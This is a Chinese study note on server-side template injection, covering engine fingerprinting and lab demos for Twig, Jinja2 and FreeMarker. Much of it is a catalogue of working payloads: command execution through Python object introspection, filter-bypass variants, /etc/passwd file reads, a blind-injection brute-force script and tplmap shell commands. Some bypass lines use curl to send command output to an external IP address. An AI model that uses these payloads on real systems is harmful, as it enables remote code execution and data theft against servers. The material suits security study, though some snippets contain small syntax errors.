# 说明
此篇主要记录学习过程中遇到的问题，所属的安全场景均来自互联网，仅做学习研究

## 1 简介
## 1.1 模板作用
&ensp;&ensp;&ensp;&ensp;借助于模板引擎，开发人员就可以在应用程序中使用静态模板文件了。在运行时，模板引擎会用实际值替换模板文件中的相关变量，并将模板转化为HTML文件发送给客户端。这种方法使设计HTML页面变得更加轻松。
&ensp;&ensp;&ensp;&ensp;虽然模板是静态部署的，但高度可配置服务（SaaS）的出现使得一些模板库可以直接“暴露”在互联网上。这些看似非常有限的模版库其实比许多开发者想象的要强大得多。
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/4b51f99876f9fdd3a2caa4dc2e2f510b.png)
### 模板的作用
**1、数据绑定示例**
&ensp;&ensp;&ensp;&ensp;在模板中，开发人员需要为动态值定义静态内容和占位符。在运行时，模板将交由引擎处理，以映射模板中的动态值引用。
```txt
Hello {{firstName}} {{lastName}}!
```
**2、简单模板示例**
&ensp;&ensp;&ensp;&ensp;模板是通常以脚本的形式提供，它的作用不仅仅是简单的数据绑定。因为数据结构可能很复杂（比如列表和嵌套对象），所以，模板通常会提供一些类似于编程的功能。例如，模板引擎可能会允许访问对象的相关字段，具体如下所示：
```txt
Hello {{user.firstName}} {{user.lastName}}!
```
**3、嵌套属性示例**
&ensp;&ensp;&ensp;&ensp;像上面这样的嵌套属性并不会直接交由语言进行处理，相反，而是由引擎来解析占位符内的动态值user.firstName。引擎将直接调用方法或字段firstname。这种语法通常简单紧凑，以便于使用。同时，由于这些语法通常非常强大，以至于可以脱离简单数据绑定的上下文。

## 2 模板注入
&ensp;&ensp;&ensp;&ensp;所谓模板注入，又称服务器端模板注入（SSTI），是2015年出现的一类安全漏洞。James Kettle在2015年黑帽大会上进行的演讲，为多个模板引擎的漏洞利用技术奠定了坚实的基础。要想利用这类安全漏洞，需要对相关的模板库或相关的语言有一定程度的了解。
&ensp;&ensp;&ensp;&ensp;为了滥用模板引擎，攻击者需要充分利用模板引擎所提供的各种功能。如果引擎允许访问字段，就可以访问我们感兴趣的内部数据结构。进一步，这些内部数据结构可能具有我们想覆盖的状态。因此，它们可能会暴露出强大的类型。如果引擎允许函数调用，那么，我们的目标就是读取文件、执行命令或访问应用程序的内部状态的函数。
### 2.1 识别模板引擎
&ensp;&ensp;&ensp;&ensp;目前，已经存在大量的模板库。实际上，我们可以在每种编程语言中找到几十个库。在实践中，如果我们把自己限制在最流行的库中，当我们知道使用的语言时，我们可以将注意力集中在2到3个潜在的库上面。
C#（StringTemplate，Sharepoint上动态使用的ASPX）。
Java(Velocity、Freemarker、Pebble、Thymeleaf和Jinjava)
PHP（Twig、Smarty、Dwoo、Volt、Blade、Plates、Mustache、Tornado、mustache和String Template）
Python （Jinja2、Makoto、Django）
Go (text/template)
**对应的模板引擎如下表**：
![image.png](http://moonsec.top/articlepic/6db781ccb8fda0f70b821e17e58e1e8c.png)

### 2.2 模板注入方法
James Kettles提出模板注入方法
![image.png](http://moonsec.top/articlepic/d27ccb4c08535c2eb54a349e2c911b44.png)
启发式方法
&ensp;&ensp;&ensp;&ensp;与其盲目地测试每一个已知的payload，不如以某种程度的置信度来确认所使用的技术。另外，最终的payload可能需要进行一些调整，以符合特定的运行时环境的要求。
&ensp;&ensp;&ensp;&ensp;下面是James Kettles提出的决策树，可以用来识别所使用的模板。这个决策树是由简单的评估组成的，其中的表达式无法适用于每一种技术。由于这些都是非常基本的表达式，所以当一个模版库的新版本发布时，这些表达式也不会很快变得过时。当然，相关的方法名和高级语法可能会随着时间的推移而发生变化。
作者给出了决策树，输入{{7*7}}，不同的模板会有不同输出结果，Twig模板输出49,Jinja2模板输出7777777
![image.png](http://moonsec.top/articlepic/cf9cddec9e8b1d5261c31b9078b90376.png)

## 3 几个Demo
&ensp;&ensp;&ensp;&ensp;相关的练习可以从下述地址下载：
https://github.com/GoSecure/template-injection-workshop

### 3.1 Twig (PHP)

 根据上述的地址下载代码并执行
![image.png](http://moonsec.top/articlepic/7162bbdce181f7abad73a315b7ccb2d3.png)
尝试下输入{{7*7}}
![image.png](http://moonsec.top/articlepic/9ce7158cf4d07a11383c2e1a9a37b26c.png)
查看对应的源码
```txt
include('vendor/twig/twig/lib/Twig/Autoloader.php');
if (isset($_POST['email'])) {
    $email=$_POST['email'];

    Twig_Autoloader::register();
    try {
        $loader = new Twig_Loader_String();
        $twig = new Twig_Environment($loader);

        $result= $twig->render("Thanks {$email}. You will be notified soon.");
        echo $result;

    } catch (Exception $e) {
        echo $e->getMessage();
    }
}

```
通过$twig->render("Thanks {$email} 解析了前台输入的内容
$twig 是一个变量_self，它公开了一些内部 Twig API。这是为利用该registerUndefinedFilterCallback功能而创建的恶意负载。在下面的有效负载中，id执行命令返回当前用户 (Linux) 的 id。
```txt
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
![image.png](http://moonsec.top/articlepic/6742341ccfca3d97a082fa2be09fbf8d.png)

### 3.2 Jinja2（Python）
利用源码做简单的修改，咱们做个demo
```py
from flask import Flask, request, session, g, redirect, url_for, abort, render_template, flash, Response
from jinja2 import Environment
from datetime import date

app = Flask(__name__)
Jinja2 = Environment()


# app.config.from_pyfile('config.py')


@app.route("/gen_vcard", methods=['POST'])
def gen_vcard():
    name = request.values.get('name')
    if (name is None): name = "Anonymous"
    org = request.values.get('org')
    phone = request.values.get('phone')
    email = request.values.get('email')

    d = date.today()
    output = Jinja2.from_string("""BEGIN:VCARD
VERSION:2.1
N:""" + (";".join(name.split(" "))) + """
FN:""" + name + """
ORG:""" + org + """
TEL;WORK;VOICE:""" + phone + """
EMAIL:""" + email + """
REV:""" + d.isoformat() + """
END:VCARD""").render()

    # Instead, the variable should be passed to the template context.
    # Jinja2.from_string('Hello {{name}}!').render(name = name)

    return output, 200


@app.route("/")
def index():
    return render_template('index.html')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8089)
```
页面显示的信息如下：
![image.png](http://moonsec.top/articlepic/426a87916d821715e550525b73907b9e.png)
得到的信息如下：
![image.png](http://moonsec.top/articlepic/1c68657ee81f1469fef51696c8259e83.png)
因此上述肯定存在SSTI注入的漏洞
找一个可用的poc
```py
{{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
```
![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/45bcde9a7dbaa630b58bdfc8d0314422.png)
执行成功
**ps：** 该poc基于python3 ，不同的环境需要进行对应的修改
调试下，发现在\Jinja2Demo\venv\Lib\site-packages\jinja2\environment.py的from_code中调用了python3 的exec方法
![image.png](http://moonsec.top/articlepic/1268dcc65b673cde6e83d89d3c2438d0.png)

#### 3.2.1 注入思路|payload

```python
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价

```

##### 注入思路
随便找一个内置类对象用__class__拿到他所对应的类
用__bases__拿到基类（<class 'object'>）
用__subclasses__()拿到子类列表
在子类列表中直接寻找可以利用的类getshell
##### 接下来只要找到能够利用的类（方法、函数）就好了：
可以使用如下脚本帮助查找方法：
```python
from flask import Flask,request
from jinja2 import Template
search = 'eval'   
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```
#### 3.2.2 python2、python3通用payload
因为每个环境使用的python库不同 所以类的排序有差异
直接使用popen（python2不行）
os._wrap_close类里有popen。

```python
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
```

使用os下的popen
可以从含有os的基类入手，比如说linecache。

```python
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

使用__import__下的os（python2不行）
可以使用__import__的os。

```python
"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```

__builtins__下的多个函数
__builtins__下有eval，__import__等的函数，可以利用此来执行命令。

```python
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

利用python2的file类读写文件
在python3中file类被删除了，所以以下payload只有python2中可行。
用dir来看看内置的方法:

```python
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
#写文件
"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
```

#python2的str类型不直接从属于属于基类，所以要两次 .__bases__
通用getshell
原理就是找到含有__builtins__的类，然后利用。

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
#读写文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

#### 3.2.3 绕过
**绕过中括号**
```python
#通过__bases__.__getitem__(0)（__subclasses__().__getitem__(128)）绕过__bases__[0]（__subclasses__()[128]）
#通过__subclasses__().pop(128)绕过__bases__[0]（__subclasses__()[128]）
"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()
```

**过滤{{或者}}**

可以使用{%绕过
{%%}中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果
```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://39.105.116.195:8080/?i=`whoami`').read()=='p' %}1{% endif %}
```

**过滤_**
用编码绕过
```python
比如：__class__ => \x5f\x5fclass\x5f\x5f

_是\x5f，.是\x2E
过滤了_可以用dir(0)[0][0]或者request['args']或者 request['values']绕过
但是如果还过滤了 args所以我们用request[‘values’]和attr结合绕过
例如''.__class__写成 ''|attr(request['values']['x1']),然后post传入x1=__class__

```


**绕过逗号+中括号**
```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{{().__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.os.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
```

**过滤.**
.在payload中是很重要的，但是我们依旧可以采用attr()或[]绕过
举例
```python
正常payload：
url?name={{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ipconfig").read()')}}`

使用attr()绕过：

{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}

使用[]绕过：
可以用getitem()用来获取序号

url?name={{ config['__class__']['__init__']['__globals__']['os']['popen']('ipconfig')['read']() }}

其他：
''.__class__可以写成 getattr('',"__class__")或者 ’'|attr("__class__")
```

**过滤[]**
可以用getitem()用来获取序号

```python
"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)
```





绕过双大括号（dns外带）
```python
{% if ''.__class__.__bases__.__getitem__(0).__subclasses__().pop(250).__init__.__globals__.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

python2下的盲注
python2下如果不能用命令执行，可以使用file类进行盲注
```python
import requests
url = 'http://127.0.0.1:8080/'
def check(payload):
    postdata = {
        'exploit':payload
        }
    r = requests.post(url, data=postdata).content
    return '~p0~' in r
password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'
for i in xrange(0,100):
    for c in s:
        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
        if check(payload):
            password += c
            break
    print password
```
绕过 引号 中括号 通用getshell

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==chr(95)%2bchr(119)%2bchr(114)%2bchr(97)%2bchr(112)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(111)%2bchr(115)%2bchr(101) %}{{ c.__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read() }}{% endif %}{% endfor %}
```

## 3.3 FreeMark模板注入

### 3.3.1 freemarker 简述#
FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。

这种方式通常被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。

其实FreeMarker的原理就是：模板+数据模型=输出，它基于模板来生成文本输出。其原理如下图所示：

![image.png](http://moonsec.top/articlepic/447963e3d27274805edee64f5289ba8a.png)


### 3.3.2 FreeMarker 插值${} 的新认识
1、插值的定义
插值，其表示为：${...}的格式。
2、FreeMarker中的插值
在FreeMarker模板语言中，插值${...}将使用数据模型中的部分替代输出。

### 3.3.3 FreeMarker assign 指令介绍
FreeMarker assign 简单使用

assign指令用于为该模板页面创建或替换一个顶层变量，或者创建或替换多个变量等。它的最简单的语法如下:
<#assign name=value [in namespacehash]>,
这个用法用于指定一个名为name的变量，该变量的值为value。此外，FreeMarker允许在使用assign指令里增加in子句。in子句用于将创建的name变量放入namespacehash命名空间中。
FreeMarker assign 指令用于在页面上定义一个变量，而变量又分为下面两种类型：

（1）定义简单类型

```HTML
<#assign name="Tom">
my name is ${name}
```

（2）定义对象类型

```HTML
<#assign info={"mobile":"xxxxxx","address":"china"} >
my mobile is ${info.mobile}, my address is ${info.address}
```

二、FreeMarker assign 语法介绍（4种形式）

```HTML
<#assign name1=value1 name2=value2 ... nameN=valueN>

<#assign same as above... in namespacehash>

<#assign name>
capture this
</#assign>

<#assign name in namespacehash>
capture this
</#assign>
```

三、FreeMarker assign 多变量定义

比如：变量 seq 存储一个序列：


<#assign seq = ["foo", "bar", "baz"]>

比如：变量 x 中存储增长的数字：


<#assign x++>

作为一个方便的特性，可以使用一个 assign 标记来进行多次定义，如下所示：


<#assign
seq = ["foo", "bar", "baz"]
x++
四、FreeMarker assign 变量+命名空间

assign 指令在命名空间中创建变量。通常它在当前的命名空间 (也就是和标签所在模板关联的命名空间)中创建变量。但如果你是用了 in namespacehash， 那么你可以用另外一个命名空间来创建/替换变量。比如，这里你在命名空间中 /mylib.ftl 创建/替换了变量 bgColor：


<#import "/mylib.ftl" as my>
<#assign bgColor="red" in my>

五、FreeMarker assign 复杂变量

assign 的极端使用是捕捉它的开始标记和结束标记中间生成的输出时。 也就是说，在标记之间打印的东西将不会在页面上显示， 但是会存储在变量中。比如：
```HTML
<#macro myMacro>foo</#macro>
<#assign x>
  <#list 1..3 as n>
    ${n} <@myMacro />
  </#list>
</#assign>

Number of words: ${x?word_list?size}
${x}

将会输出：

Number of words: 6
1 foo
2 foo
3 foo

```
### 3.3.4 漏洞复现
[项目源码地址](https://github.com/GoSecure/template-injection-workshop)，在对应的项目中登录后，在模板处输入：<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }

可以得到对应的结果：

![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/56b785b39a4c31cf7725ae6ef6a6558e.png)

### 3.3.2 分析
查看后台的代码，发现触发的位置在：
![image.png](http://moonsec.top/articlepic/e9457fd8e37881e1ae2e65efbe9f1cc7.png)

![image.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/168970c98d3a011e4ab0ffac5e622e4f.png)


### 3.6 FreeMark相关的注入说明
**内置函数**
**new**
可创建任意实现了TemplateModel接口的Java对象，同时还可以触发没有实现 TemplateModel接口的类的静态初始化块。
以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承TemplateModel接口的==freemarker.template.utility.JythonRuntime==和==freemarker.template.utility.Execute==。

**API**
value?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。
但是，当api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false。

**POC1**

```HTML
<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("open -a Calculator.app"")}
```


**POC2**

``HTML
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}
```

**POC3**

```HTML
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")
```

**POC4**

```HTML
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("open -a Calculator.app") }
```

**读取文件
**
```HTML
<#assign is=object?api.class.getResourceAsStream("/Test.class")>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]

```





# 模板注入攻击工具

**Tqlmap**
Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。适用于有参数的注入
```txt
python tplmap.py -u http://xxxx/*     （无参数）
python tplmap.py -u http://xxxx?name=1 (有参数)
python tplmap.py -u url --os-shell   （获取shell）
```
## 3.7 Thymeleaf SSTI分析
https://www.anquanke.com/post/id/254519

# 参考
1、https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security.pdf
2、https://portswigger.net/research/server-side-template-injection
3、https://blog.51cto.com/u_14299052/3104121
4、https://gosecure.github.io/template-injection-workshop/#0
5、https://xz.aliyun.com/t/7746 ----python的ssti注入方法
6、https://blog.csdn.net/solitudi/article/details/107752717 ssti 方法绕过
7、https://github.com/GoSecure/template-injection-workshop -----源码githuab 地址
8、https://www.anquanke.com/post/id/254519